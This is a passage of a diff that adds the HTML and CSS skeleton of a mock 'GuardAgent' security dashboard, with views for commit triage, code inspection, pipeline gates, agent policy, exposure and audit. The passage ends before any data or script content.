@@ -1,0 +1,1115 @@
+<!DOCTYPE html>
+<html lang="en" data-theme="dark">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>GuardAgent Control Plane — AI Security Gate</title>
+<style>
+:root{
+  --bg:#0a0e14; --bg2:#0e131c; --surface:#111826; --surface2:#16202f; --line:#1e2a3d;
+  --txt:#d7e0ec; --txt2:#8a99ad; --txt3:#5a6b80;
+  --accent:#22d3ee; --accent2:#0ea5b7; --accent-dim:rgba(34,211,238,.12);
+  --ok:#34d399; --warn:#fbbf24; --crit:#f87171; --block:#ef4444; --quar:#c084fc; --review:#60a5fa;
+  --ok-dim:rgba(52,211,153,.12); --warn-dim:rgba(251,191,36,.12); --crit-dim:rgba(248,113,113,.12);
+  --quar-dim:rgba(192,132,252,.12); --review-dim:rgba(96,165,250,.12);
+  --mono:'SFMono-Regular',Consolas,'Cascadia Code',monospace;
+  --radius:8px; --shadow:0 8px 30px rgba(0,0,0,.35);
+}
+[data-theme="light"]{
+  --bg:#f4f6f9; --bg2:#eef1f6; --surface:#ffffff; --surface2:#f7f9fc; --line:#dde4ee;
+  --txt:#1a2433; --txt2:#4d5d72; --txt3:#8595a8;
+  --accent:#0891b2; --accent2:#0e7490; --accent-dim:rgba(8,145,178,.10);
+  --ok:#059669; --warn:#d97706; --crit:#dc2626; --block:#dc2626; --quar:#9333ea; --review:#2563eb;
+  --ok-dim:rgba(5,150,105,.10); --warn-dim:rgba(217,119,6,.10); --crit-dim:rgba(220,38,38,.08);
+  --quar-dim:rgba(147,51,234,.08); --review-dim:rgba(37,99,235,.08);
+  --shadow:0 8px 30px rgba(20,40,80,.08);
+}
+*{margin:0;padding:0;box-sizing:border-box}
+html{font-size:14px}
+body{background:var(--bg);color:var(--txt);font-family:'Inter','Segoe UI',system-ui,sans-serif;line-height:1.45;overflow-x:hidden}
+::-webkit-scrollbar{width:9px;height:9px}::-webkit-scrollbar-thumb{background:var(--line);border-radius:5px}::-webkit-scrollbar-track{background:transparent}
+
+/* ---------- layout ---------- */
+.app{display:grid;grid-template-columns:228px 1fr;min-height:100vh}
+.sidebar{background:var(--bg2);border-right:1px solid var(--line);position:sticky;top:0;height:100vh;display:flex;flex-direction:column;z-index:40}
+.main{min-width:0;display:flex;flex-direction:column}
+.topbar{position:sticky;top:0;z-index:30;background:color-mix(in srgb,var(--bg) 82%,transparent);backdrop-filter:blur(10px);border-bottom:1px solid var(--line);display:flex;align-items:center;gap:14px;padding:0 22px;height:54px}
+.content{padding:22px;max-width:1560px;width:100%}
+
+/* ---------- brand ---------- */
+.brand{display:flex;align-items:center;gap:10px;padding:16px 16px 14px;border-bottom:1px solid var(--line)}
+.brand-glyph{width:32px;height:32px;flex:none}
+.brand-name{font-weight:700;font-size:.95rem;letter-spacing:.02em}
+.brand-name small{display:block;font-weight:500;font-size:.68rem;color:var(--accent);letter-spacing:.14em;text-transform:uppercase}
+
+/* ---------- nav ---------- */
+.nav{padding:10px 8px;flex:1;overflow-y:auto}
+.nav-label{font-size:.64rem;letter-spacing:.16em;text-transform:uppercase;color:var(--txt3);padding:12px 10px 5px}
+.nav a{display:flex;align-items:center;gap:10px;padding:7px 10px;border-radius:6px;color:var(--txt2);text-decoration:none;font-size:.85rem;font-weight:500;margin-bottom:1px;border:1px solid transparent}
+.nav a:hover{color:var(--txt);background:var(--surface)}
+.nav a.active{color:var(--accent);background:var(--accent-dim);border-color:color-mix(in srgb,var(--accent) 25%,transparent)}
+.nav a .badge{margin-left:auto}
+.nav svg{width:15px;height:15px;flex:none;stroke-width:1.8}
+.sidebar-foot{padding:12px 16px;border-top:1px solid var(--line);font-size:.7rem;color:var(--txt3)}
+.sidebar-foot b{color:var(--txt2)}
+
+/* ---------- topbar ---------- */
+.crumb{font-size:.85rem;color:var(--txt2)}.crumb b{color:var(--txt);font-weight:600}
+.search{flex:1;max-width:380px;position:relative}
+.search input{width:100%;background:var(--surface);border:1px solid var(--line);border-radius:6px;color:var(--txt);padding:6px 10px 6px 30px;font-size:.82rem;outline:none}
+.search input:focus{border-color:var(--accent2)}
+.search svg{position:absolute;left:9px;top:8px;width:13px;height:13px;color:var(--txt3)}
+.top-right{margin-left:auto;display:flex;align-items:center;gap:10px}
+.env-pill{display:flex;align-items:center;gap:6px;background:var(--surface);border:1px solid var(--line);border-radius:6px;padding:5px 10px;font-size:.75rem;color:var(--txt2)}
+.env-pill .dot{width:7px;height:7px;border-radius:50%;background:var(--ok);box-shadow:0 0 6px var(--ok)}
+.clock{font-family:var(--mono);font-size:.75rem;color:var(--txt3)}
+.icon-btn{background:var(--surface);border:1px solid var(--line);border-radius:6px;color:var(--txt2);width:30px;height:30px;display:grid;place-items:center;cursor:pointer}
+.icon-btn:hover{color:var(--accent);border-color:var(--accent2)}
+.avatar{width:30px;height:30px;border-radius:50%;background:linear-gradient(135deg,var(--accent2),#155e75);display:grid;place-items:center;font-size:.7rem;font-weight:700;color:#fff}
+
+/* ---------- generic ---------- */
+.view{display:none;animation:fadein .25s ease}
+.view.active{display:block}
+@keyframes fadein{from{opacity:0;transform:translateY(4px)}to{opacity:1;transform:none}}
+.page-head{display:flex;align-items:flex-start;justify-content:space-between;gap:16px;margin-bottom:18px;flex-wrap:wrap}
+.page-head h1{font-size:1.25rem;font-weight:700;letter-spacing:-.01em}
+.page-head p{color:var(--txt2);font-size:.83rem;margin-top:3px;max-width:640px}
+.card{background:var(--surface);border:1px solid var(--line);border-radius:var(--radius);padding:16px}
+.card h3{font-size:.8rem;font-weight:600;color:var(--txt2);text-transform:uppercase;letter-spacing:.08em;margin-bottom:12px;display:flex;align-items:center;gap:8px}
+.grid{display:grid;gap:14px}
+.g4{grid-template-columns:repeat(4,1fr)}.g3{grid-template-columns:repeat(3,1fr)}.g2{grid-template-columns:repeat(2,1fr)}
+.g23{grid-template-columns:2fr 1fr}.g32{grid-template-columns:1fr 2fr}
+.mt{margin-top:14px}
+
+.badge{display:inline-flex;align-items:center;gap:5px;font-size:.68rem;font-weight:600;padding:2px 8px;border-radius:20px;letter-spacing:.03em;white-space:nowrap}
+.b-crit{background:var(--crit-dim);color:var(--crit)} .b-high{background:rgba(251,146,60,.13);color:#fb923c}
+.b-med{background:var(--warn-dim);color:var(--warn)} .b-low{background:var(--review-dim);color:var(--review)}
+.b-ok{background:var(--ok-dim);color:var(--ok)} .b-quar{background:var(--quar-dim);color:var(--quar)}
+.b-neutral{background:var(--surface2);color:var(--txt2);border:1px solid var(--line)}
+.b-accent{background:var(--accent-dim);color:var(--accent)}
+.pulse::before{content:'';width:6px;height:6px;border-radius:50%;background:currentColor;animation:pulse 1.6s infinite}
+@keyframes pulse{0%,100%{opacity:1}50%{opacity:.3}}
+
+table{width:100%;border-collapse:collapse;font-size:.82rem}
+th{text-align:left;font-size:.66rem;text-transform:uppercase;letter-spacing:.1em;color:var(--txt3);font-weight:600;padding:8px 10px;border-bottom:1px solid var(--line);cursor:pointer;user-select:none;white-space:nowrap}
+th:hover{color:var(--accent)}
+td{padding:9px 10px;border-bottom:1px solid var(--line);vertical-align:middle}
+tbody tr{cursor:pointer;transition:background .12s}
+tbody tr:hover{background:var(--surface2)}
+tbody tr:last-child td{border-bottom:none}
+.mono{font-family:var(--mono);font-size:.76rem}
+.muted{color:var(--txt2)}.dim{color:var(--txt3)}
+
+.btn{display:inline-flex;align-items:center;gap:7px;background:var(--accent);color:#04161a;border:none;border-radius:6px;padding:7px 14px;font-size:.8rem;font-weight:600;cursor:pointer;font-family:inherit}
+.btn:hover{background:var(--accent2);color:#fff}
+.btn.ghost{background:var(--surface);color:var(--txt2);border:1px solid var(--line)}
+.btn.ghost:hover{color:var(--accent);border-color:var(--accent2);background:var(--surface)}
+.btn.danger{background:var(--crit-dim);color:var(--crit);border:1px solid color-mix(in srgb,var(--crit) 30%,transparent)}
+.btn.sm{padding:4px 10px;font-size:.73rem}
+
+/* ---------- KPI ---------- */
+.kpi{background:var(--surface);border:1px solid var(--line);border-radius:var(--radius);padding:14px 16px;position:relative;overflow:hidden}
+.kpi .k-label{font-size:.68rem;text-transform:uppercase;letter-spacing:.1em;color:var(--txt3);font-weight:600}
+.kpi .k-value{font-size:1.7rem;font-weight:700;letter-spacing:-.02em;margin:4px 0 2px;font-variant-numeric:tabular-nums}
+.kpi .k-delta{font-size:.72rem;font-weight:600}
+.kpi .k-spark{position:absolute;right:12px;bottom:10px;opacity:.9}
+.k-up{color:var(--ok)}.k-down{color:var(--crit)}
+.kpi.alert{border-color:color-mix(in srgb,var(--crit) 35%,var(--line))}
+.kpi.alert::after{content:'';position:absolute;inset:0 0 auto 0;height:2px;background:linear-gradient(90deg,transparent,var(--crit),transparent)}
+
+/* posture ring */
+.ring-wrap{display:flex;align-items:center;gap:18px}
+.ring{position:relative;width:118px;height:118px;flex:none}
+.ring svg{transform:rotate(-90deg)}
+.ring .ring-txt{position:absolute;inset:0;display:grid;place-items:center;text-align:center}
+.ring .ring-txt b{font-size:1.6rem;letter-spacing:-.02em}
+.ring .ring-txt span{font-size:.62rem;color:var(--txt3);text-transform:uppercase;letter-spacing:.1em}
+
+/* feed */
+.feed{display:flex;flex-direction:column}
+.feed-item{display:flex;gap:12px;padding:10px 2px;border-bottom:1px solid var(--line)}
+.feed-item:last-child{border-bottom:none}
+.feed-dot{width:8px;height:8px;border-radius:50%;margin-top:6px;flex:none}
+.feed-item .f-title{font-size:.82rem;font-weight:600}
+.feed-item .f-meta{font-size:.72rem;color:var(--txt3);font-family:var(--mono);margin-top:2px}
+
+/* ---------- drawer ---------- */
+.drawer-veil{position:fixed;inset:0;background:rgba(2,6,12,.5);z-index:60;opacity:0;pointer-events:none;transition:opacity .2s}
+.drawer{position:fixed;top:0;right:-560px;width:min(560px,94vw);height:100vh;background:var(--bg2);border-left:1px solid var(--line);z-index:70;transition:right .25s ease;display:flex;flex-direction:column;box-shadow:var(--shadow)}
+.drawer.open{right:0}.drawer-veil.open{opacity:1;pointer-events:auto}
+.drawer-head{padding:16px 20px;border-bottom:1px solid var(--line);display:flex;align-items:center;gap:12px}
+.drawer-head h2{font-size:1rem;flex:1}
+.drawer-body{padding:18px 20px;overflow-y:auto;flex:1}
+.d-section{margin-bottom:18px}
+.d-section h4{font-size:.68rem;text-transform:uppercase;letter-spacing:.12em;color:var(--txt3);margin-bottom:8px;font-weight:600}
+.d-kv{display:grid;grid-template-columns:130px 1fr;gap:5px 12px;font-size:.8rem}
+.d-kv dt{color:var(--txt3)}.d-kv dd{color:var(--txt)}
+.diffbox{background:var(--bg);border:1px solid var(--line);border-radius:6px;padding:10px 12px;font-family:var(--mono);font-size:.74rem;line-height:1.6;overflow-x:auto;white-space:pre}
+.diffbox .add{color:var(--ok)}.diffbox .del{color:var(--crit)}.diffbox .ctx{color:var(--txt3)}
+.rule-chip{display:inline-block;background:var(--surface);border:1px solid var(--line);border-radius:5px;padding:3px 8px;font-size:.72rem;font-family:var(--mono);margin:0 6px 6px 0;color:var(--txt2)}
+.drawer-foot{padding:14px 20px;border-top:1px solid var(--line);display:flex;gap:8px;flex-wrap:wrap}
+
+/* ---------- inspector ---------- */
+.inspect-grid{display:grid;grid-template-columns:1fr 1fr;gap:14px;align-items:start}
+textarea.code-in{width:100%;min-height:340px;background:var(--bg);border:1px solid var(--line);border-radius:var(--radius);color:var(--txt);font-family:var(--mono);font-size:.78rem;padding:14px;resize:vertical;outline:none;line-height:1.55}
+textarea.code-in:focus{border-color:var(--accent2)}
+.finding{border:1px solid var(--line);border-left:3px solid var(--txt3);border-radius:6px;padding:11px 13px;margin-bottom:9px;background:var(--surface2)}
+.finding.sev-critical{border-left-color:var(--crit)}.finding.sev-high{border-left-color:#fb923c}
+.finding.sev-medium{border-left-color:var(--warn)}.finding.sev-low{border-left-color:var(--review)}
+.finding .f-head{display:flex;align-items:center;gap:8px;flex-wrap:wrap}
+.finding .f-name{font-weight:600;font-size:.84rem}
+.finding .f-line{margin-left:auto;font-family:var(--mono);font-size:.7rem;color:var(--txt3)}
+.finding .f-desc{font-size:.78rem;color:var(--txt2);margin-top:5px}
+.finding .f-code{font-family:var(--mono);font-size:.72rem;background:var(--bg);border-radius:4px;padding:5px 8px;margin-top:6px;overflow-x:auto;white-space:pre;color:var(--warn)}
+.verdict{border-radius:var(--radius);padding:16px;display:flex;align-items:center;gap:16px;border:1px solid var(--line);margin-bottom:14px}
+.verdict .v-badge{font-size:1rem;font-weight:800;letter-spacing:.05em;padding:8px 18px;border-radius:6px}
+.verdict.v-allow .v-badge{background:var(--ok-dim);color:var(--ok)}
+.verdict.v-review .v-badge{background:var(--review-dim);color:var(--review)}
+.verdict.v-block .v-badge{background:var(--crit-dim);color:var(--crit)}
+.verdict.v-quarantine .v-badge{background:var(--quar-dim);color:var(--quar)}
+.scorebars{display:grid;gap:8px}
+.sb{display:grid;grid-template-columns:150px 1fr 38px;align-items:center;gap:10px;font-size:.76rem}
+.sb .track{height:6px;background:var(--bg);border-radius:3px;overflow:hidden}
+.sb .fill{height:100%;border-radius:3px;transition:width .5s ease}
+.sb .num{font-family:var(--mono);text-align:right;color:var(--txt2)}
+
+/* ---------- pipeline ---------- */
+.pipe{border:1px solid var(--line);border-radius:var(--radius);background:var(--surface);padding:14px 16px;margin-bottom:12px}
+.pipe-head{display:flex;align-items:center;gap:12px;flex-wrap:wrap}
+.pipe-head .p-name{font-weight:600;font-size:.88rem}
+.pipe-head .p-meta{font-family:var(--mono);font-size:.72rem;color:var(--txt3)}
+.stages{display:flex;align-items:center;gap:0;margin-top:12px;overflow-x:auto;padding-bottom:4px}
+.stage{display:flex;flex-direction:column;align-items:center;gap:5px;min-width:96px}
+.stage .s-dot{width:26px;height:26px;border-radius:50%;display:grid;place-items:center;border:2px solid var(--line);background:var(--surface2);font-size:.7rem}
+.stage .s-name{font-size:.68rem;color:var(--txt2)}
+.stage.passed .s-dot{border-color:var(--ok);color:var(--ok)}
+.stage.warned .s-dot{border-color:var(--warn);color:var(--warn)}
+.stage.blocked .s-dot{border-color:var(--crit);color:var(--crit);background:var(--crit-dim)}
+.stage.review .s-dot{border-color:var(--review);color:var(--review)}
+.stage.quarantined .s-dot{border-color:var(--quar);color:var(--quar)}
+.stage.pending .s-dot{border-color:var(--line);color:var(--txt3)}
+.s-link{height:2px;flex:1;min-width:20px;background:var(--line);margin-bottom:18px}
+.pipe-reason{margin-top:10px;font-size:.78rem;background:var(--bg);border:1px solid var(--line);border-radius:6px;padding:9px 12px;color:var(--txt2)}
+.pipe-reason b{color:var(--txt)}
+
+/* ---------- agent console ---------- */
+.timeline{position:relative;padding-left:22px}
+.timeline::before{content:'';position:absolute;left:7px;top:6px;bottom:6px;width:2px;background:var(--line)}
+.t-item{position:relative;padding:0 0 16px}
+.t-item::before{content:'';position:absolute;left:-19px;top:5px;width:10px;height:10px;border-radius:50%;background:var(--surface);border:2px solid var(--txt3)}
+.t-item.t-ok::before{border-color:var(--ok)} .t-item.t-deny::before{border-color:var(--crit);background:var(--crit-dim)}
+.t-item.t-warn::before{border-color:var(--warn)} .t-item.t-appr::before{border-color:var(--review)}
+.t-item .t-time{font-family:var(--mono);font-size:.68rem;color:var(--txt3)}
+.t-item .t-body{font-size:.8rem;margin-top:2px}
+.t-item .t-body b{font-weight:600}
+
+/* ---------- exposure ---------- */
+.exp-row{display:flex;align-items:center;gap:12px;padding:9px 0;border-bottom:1px solid var(--line);font-size:.8rem}
+.exp-row:last-child{border-bottom:none}
+.meter{flex:1;height:6px;background:var(--bg);border-radius:3px;overflow:hidden}
+.meter i{display:block;height:100%;border-radius:3px}
+
+/* ---------- NIST ---------- */
+.nist-band{display:grid;grid-template-columns:repeat(6,1fr);gap:10px}
+.nist-fn{border:1px solid var(--line);border-radius:var(--radius);background:var(--surface);padding:12px;text-align:center}
+.nist-fn .n-code{font-size:.62rem;letter-spacing:.14em;color:var(--txt3);text-transform:uppercase}
+.nist-fn .n-name{font-weight:700;font-size:.85rem;margin:2px 0 6px}
+.nist-fn .n-score{font-size:1.35rem;font-weight:700;font-variant-numeric:tabular-nums}
+.nist-fn .n-open{font-size:.68rem;color:var(--txt3);margin-top:3px}
+
+/* ---------- toast ---------- */
+.toast-zone{position:fixed;bottom:20px;right:20px;z-index:90;display:flex;flex-direction:column;gap:8px}
+.toast{background:var(--surface);border:1px solid var(--line);border-left:3px solid var(--accent);border-radius:6px;padding:11px 16px;font-size:.8rem;box-shadow:var(--shadow);animation:toastin .25s ease;max-width:360px}
+@keyframes toastin{from{opacity:0;transform:translateX(20px)}to{opacity:1;transform:none}}
+
+/* ---------- responsive ---------- */
+.menu-btn{display:none}
+@media(max-width:1180px){.g4{grid-template-columns:repeat(2,1fr)}.g23,.g32,.g3,.inspect-grid{grid-template-columns:1fr}.nist-band{grid-template-columns:repeat(3,1fr)}}
+@media(max-width:820px){
+  .app{grid-template-columns:1fr}
+  .sidebar{position:fixed;left:-240px;width:228px;transition:left .25s}
+  .sidebar.open{left:0}
+  .menu-btn{display:grid}
+  .g4{grid-template-columns:1fr}.nist-band{grid-template-columns:repeat(2,1fr)}
+  .clock,.env-pill{display:none}
+  .content{padding:14px}
+}
+</style>
+</head>
+<body>
+<div class="app">
+
+<!-- ======================= SIDEBAR ======================= -->
+<aside class="sidebar" id="sidebar">
+  <div class="brand">
+    <svg class="brand-glyph" viewBox="0 0 32 32" fill="none">
+      <path d="M16 2 L28 7 V15 C28 23 22.5 28.5 16 30 C9.5 28.5 4 23 4 15 V7 Z" stroke="var(--accent)" stroke-width="1.8" fill="var(--accent-dim)"/>
+      <path d="M10.5 16 L14.5 20 L21.5 12" stroke="var(--accent)" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"/>
+      <circle cx="16" cy="16" r="13" stroke="var(--accent)" stroke-width=".6" opacity=".35" stroke-dasharray="2 4"/>
+    </svg>
+    <div class="brand-name">GuardAgent<small>Control Plane</small></div>
+  </div>
+  <nav class="nav" id="nav">
+    <div class="nav-label">Operations</div>
+    <a href="#dashboard" data-view="dashboard" class="active"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor"><rect x="3" y="3" width="7" height="9" rx="1"/><rect x="14" y="3" width="7" height="5" rx="1"/><rect x="14" y="12" width="7" height="9" rx="1"/><rect x="3" y="16" width="7" height="5" rx="1"/></svg>Executive Dashboard</a>
+    <a href="#triage" data-view="triage"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor"><path d="M6 3v12M6 15a3 3 0 1 0 0 6 3 3 0 0 0 0-6zM18 9a3 3 0 1 0 0-6 3 3 0 0 0 0 6zM18 9a9 9 0 0 1-9 9"/></svg>Commit Risk Triage<span class="badge b-crit" id="triage-count">4</span></a>
+    <a href="#inspect" data-view="inspect"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor"><path d="m8 9-4 3 4 3M16 9l4 3-4 3M13 5l-2 14"/></svg>AI Code Inspection</a>
+    <a href="#gates" data-view="gates"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor"><rect x="3" y="11" width="18" height="10" rx="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>Pipeline Gate Center</a>
+    <a href="#agents" data-view="agents"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor"><rect x="5" y="8" width="14" height="11" rx="2"/><path d="M12 8V4M8 4h8M9 13h.01M15 13h.01M9 16.5c1 .8 5 .8 6 0"/></svg>Agent Security Console<span class="badge b-quar">2</span></a>
+    <a href="#exposure" data-view="exposure"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor"><circle cx="12" cy="12" r="9"/><path d="M3 12h18M12 3c3 3.5 3 14 0 18M12 3c-3 3.5-3 14 0 18"/></svg>Threat &amp; Exposure Watch</a>
+    <div class="nav-label">Governance</div>
+    <a href="#nist" data-view="nist"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor"><path d="M12 3l8 4v5c0 5-3.5 8.5-8 9-4.5-.5-8-4-8-9V7z"/><path d="M9 12h6M12 9v6"/></svg>NIST Governance Center</a>
+    <a href="#audit" data-view="audit"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor"><path d="M14 3H6a2 2 0 0 0-2 2v14a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V9z"/><path d="M14 3v6h6M9 13h6M9 17h4"/></svg>Evidence &amp; Audit Trail</a>
+  </nav>
+  <div class="sidebar-foot">Engine <b>Fable-5 reasoning core</b><br>Policy pack <b>v2026.07 · 148 rules</b><br><span class="badge b-ok pulse" style="margin-top:6px">GATE ONLINE</span></div>
+</aside>
+
+<!-- ======================= MAIN ======================= -->
+<div class="main">
+  <header class="topbar">
+    <button class="icon-btn menu-btn" onclick="document.getElementById('sidebar').classList.toggle('open')" aria-label="Menu">☰</button>
+    <div class="crumb"><b id="crumb">Executive Dashboard</b></div>
+    <div class="search"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="11" cy="11" r="7"/><path d="m21 21-4-4"/></svg><input placeholder="Search commits, findings, agents, policies…" id="global-search"></div>
+    <div class="top-right">
+      <div class="env-pill"><span class="dot"></span>prod · eu-west-1</div>
+      <div class="clock" id="clock"></div>
+      <button class="icon-btn" onclick="toggleTheme()" title="Toggle theme" aria-label="Toggle theme"><span id="theme-ico">◐</span></button>
+      <div class="avatar">CM</div>
+    </div>
+  </header>
+
+  <main class="content" id="content">
+
+  <!-- ========== 1. EXECUTIVE DASHBOARD ========== -->
+  <section class="view active" id="view-dashboard">
+    <div class="page-head">
+      <div><h1>Executive Dashboard</h1><p>Unified posture across commit scanning, pipeline gates, AI agent policy and operational exposure. Objective: shorten the path from risky commit to understood risk to remediation.</p></div>
+      <div style="display:flex;gap:8px"><button class="btn ghost sm" onclick="toast('Report queued — weekly posture PDF will be delivered to CISO distribution list.')">Export CISO report</button><button class="btn sm" onclick="go('triage')">Open triage queue</button></div>
+    </div>
+    <div class="grid g4" id="kpi-row"></div>
+    <div class="grid g23 mt">
+      <div class="card">
+        <h3>Scan volume &amp; blocked events — 14 days</h3>
+        <svg id="main-chart" width="100%" height="190" preserveAspectRatio="none"></svg>
+        <div style="display:flex;gap:18px;font-size:.72rem;color:var(--txt2);margin-top:8px">
+          <span><i style="display:inline-block;width:10px;height:3px;background:var(--accent);border-radius:2px;vertical-align:middle"></i> Commits scanned</span>
+          <span><i style="display:inline-block;width:10px;height:3px;background:var(--crit);border-radius:2px;vertical-align:middle"></i> Gate blocks</span>
+          <span><i style="display:inline-block;width:10px;height:3px;background:var(--warn);border-radius:2px;vertical-align:middle"></i> Human reviews</span>
+        </div>
+      </div>
+      <div class="card">
+        <h3>Security posture</h3>
+        <div class="ring-wrap">
+          <div class="ring" id="posture-ring"></div>
+          <div style="font-size:.78rem;color:var(--txt2);display:grid;gap:6px">
+            <div><b style="color:var(--ok)">▲ 4 pts</b> vs last week</div>
+            <div>Driven by secret-leak MTTR down to <b style="color:var(--txt)">42 min</b></div>
+            <div>Dragged by <b style="color:var(--crit)">critical patch debt</b> on 2 edge assets</div>
+          </div>
+        </div>
+        <div class="scorebars mt" id="posture-bars"></div>
+      </div>
+    </div>
+    <div class="grid g23 mt">
+      <div class="card">
+        <h3>Latest critical events <span class="badge b-crit pulse">live</span></h3>
+        <div class="feed" id="crit-feed"></div>
+      </div>
+      <div class="card">
+        <h3>SLA &amp; remediation debt</h3>
+        <div id="sla-list"></div>
+      </div>
+    </div>
+  </section>
+
+  <!-- ========== 2. COMMIT RISK TRIAGE ========== -->
+  <section class="view" id="view-triage">
+    <div class="page-head">
+      <div><h1>Commit Risk Triage</h1><p>Every push and merge request is scanned on webhook delivery (HMAC-verified). AI verdicts below are ranked by composite risk. Click a row for the full reasoning trace.</p></div>
+      <div style="display:flex;gap:8px;align-items:center">
+        <select id="triage-filter" class="btn ghost sm" style="appearance:auto" onchange="renderTriage()">
+          <option value="all">All severities</option><option value="critical">Critical</option><option value="high">High</option><option value="medium">Medium</option><option value="low">Low</option>
+        </select>
+        <button class="btn ghost sm" onclick="toast('Re-scan requested for 8 open commits. Webhook replay dispatched.')">Re-scan queue</button>
+      </div>
+    </div>
+    <div class="card" style="padding:0">
+      <table id="triage-table">
+        <thead><tr><th>Commit</th><th>Repository</th><th>Author</th><th>Threat class</th><th>Severity</th><th>AI confidence</th><th>Decision</th><th>Age</th></tr></thead>
+        <tbody></tbody>
+      </table>
+    </div>
+  </section>
+
+  <!-- ========== 3. AI CODE INSPECTION ========== -->
+  <section class="view" id="view-inspect">
+    <div class="page-head">
+      <div><h1>AI Code Inspection Studio</h1><p>Paste code, a diff, a Dockerfile, CI config or requirements file. The multi-layer analyzer runs secret scanning, supply-chain checks, injection/obfuscation detection and exfiltration path analysis — locally, in your browser.</p></div>
+      <div style="display:flex;gap:8px">
+        <select id="sample-select" class="btn ghost sm" style="appearance:auto">
+          <option value="">Load demo sample…</option>
+          <option value="exfil">Python — env exfiltration</option>
+          <option value="typosquat">requirements.txt — typosquat</option>
+          <option value="docker">Dockerfile — fragile build</option>
+          <option value="ci">.gitlab-ci.yml — permissive rule</option>
+          <option value="clean">Python — clean utility</option>
+        </select>
+      </div>
+    </div>
+    <div class="inspect-grid">
+      <div>
+        <textarea class="code-in" id="code-input" spellcheck="false" placeholder="# Paste code, diff, Dockerfile, CI YAML or requirements.txt here…"></textarea>
+        <div style="display:flex;gap:8px;margin-top:10px;align-items:center">
+          <button class="btn" id="analyze-btn" onclick="runInspection()">▶ Run deep analysis</button>
+          <button class="btn ghost" onclick="document.getElementById('code-input').value='';document.getElementById('inspect-out').innerHTML=emptyInspect()">Clear</button>
+          <span class="dim" style="font-size:.72rem;margin-left:auto">Layers: secrets · deps · injection · obfuscation · exfiltration · CI policy · agent safety</span>
+        </div>
+      </div>
+      <div id="inspect-out"></div>
+    </div>
+  </section>
+
+  <!-- ========== 4. PIPELINE GATE CENTER ========== -->
+  <section class="view" id="view-gates">
+    <div class="page-head">
+      <div><h1>Pipeline Gate Center</h1><p>Policy-as-code meets AI reasoning. Every stage decision is explainable: which policy fired, what the model concluded, and what unblocks the pipeline.</p></div>
+      <button class="btn ghost sm" onclick="toast('Gate policy pack v2026.07 opened in policy editor (read-only demo).')">View policy pack</button>
+    </div>
+    <div id="pipes"></div>
+  </section>
+
+  <!-- ========== 5. AGENT SECURITY CONSOLE ========== -->
+  <section class="view" id="view-agents">
+    <div class="page-head">
+      <div><h1>Agent Security Console</h1><p>AI agents are actors, not just tools. Every tool call is evaluated against execution policy before it runs: sandboxed, approved, denied or escalated — with a full decision trace.</p></div>
+      <button class="btn ghost sm" onclick="toast('Execution policy editor requires the platform-admin role.')">Edit execution policy</button>
+    </div>
+    <div class="grid g4" id="agent-kpis"></div>
+    <div class="grid g23 mt">
+      <div class="card" style="padding:0">
+        <table id="agent-table">
+          <thead><tr><th>Agent</th><th>Requested action</th><th>Tool call</th><th>Risk</th><th>Policy result</th><th>Outcome</th></tr></thead>
+          <tbody></tbody>
+        </table>
+      </div>
+      <div>
+        <div class="card">
+          <h3>Live agent timeline</h3>
+          <div class="timeline" id="agent-timeline"></div>
+        </div>
+        <div class="card mt">
+          <h3>Denied operations — 24h</h3>
+          <div id="denied-ops"></div>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- ========== 6. THREAT & EXPOSURE WATCH ========== -->
+  <section class="view" id="view-exposure">
+    <div class="page-head">
+      <div><h1>Threat &amp; Exposure Watch</h1><p>Security does not stop at the diff. Internet exposure, KEV-listed vulnerabilities, patch debt and backup integrity weigh on the same posture score as code findings.</p></div>
+      <button class="btn ghost sm" onclick="toast('External attack-surface re-scan scheduled (next window: 02:00 UTC).')">Re-scan surface</button>
+    </div>
+    <div class="grid g4" id="exp-kpis"></div>
+    <div class="grid g2 mt">
+      <div class="card">
+        <h3>Internet-exposed services</h3>
+        <div id="exp-services"></div>
+      </div>
+      <div class="card">
+        <h3>KEV &amp; ransomware-linked alerts</h3>
+        <div id="kev-list"></div>
+      </div>
+    </div>
+    <div class="grid g2 mt">
+      <div class="card">
+        <h3>Patch &amp; hypervisor state</h3>
+        <div id="patch-state"></div>
+      </div>
+      <div class="card">
+        <h3>Backup &amp; recovery assurance</h3>
+        <div id="backup-state"></div>
+      </div>
+    </div>
+  </section>
+
+  <!-- ========== 7. NIST GOVERNANCE CENTER ========== -->
+  <section class="view" id="view-nist">
+    <div class="page-head">
+      <div><h1>NIST Governance Center</h1><p>Every finding is mapped to NIST CSF 2.0 functions with an owner, an SLA and evidence. Governance means the risk has a name attached to it — not just a severity.</p></div>
+      <button class="btn ghost sm" onclick="toast('CSF 2.0 control mapping exported (csf-mapping.xlsx).')">Export mapping</button>
+    </div>
+    <div class="nist-band" id="nist-band"></div>
+    <div class="card mt" style="padding:0">
+      <table id="nist-table">
+        <thead><tr><th>Finding</th><th>CSF 2.0 function</th><th>Category</th><th>Owner</th><th>SLA</th><th>Evidence</th><th>Status</th></tr></thead>
+        <tbody></tbody>
+      </table>
+    </div>
+  </section>
+
+  <!-- ========== 8. EVIDENCE & AUDIT TRAIL ========== -->
+  <section class="view" id="view-audit">
+    <div class="page-head">
+      <div><h1>Evidence &amp; Audit Trail</h1><p>Immutable log of every gate decision: trigger, policy applied, model justification, human approval and produced artifacts. Built for internal audit and CISO reporting.</p></div>
+      <div style="display:flex;gap:8px">
+        <button class="btn ghost sm" onclick="exportAudit('json')">Export JSON</button>
+        <button class="btn ghost sm" onclick="exportAudit('csv')">Export CSV</button>
+      </div>
+    </div>
+    <div class="card" style="padding:0">
+      <table id="audit-table">
+        <thead><tr><th>Timestamp</th><th>Trigger</th><th>Repo / subject</th><th>Policy</th><th>Decision</th><th>Approver</th><th>Evidence</th></tr></thead>
+        <tbody></tbody>
+      </table>
+    </div>
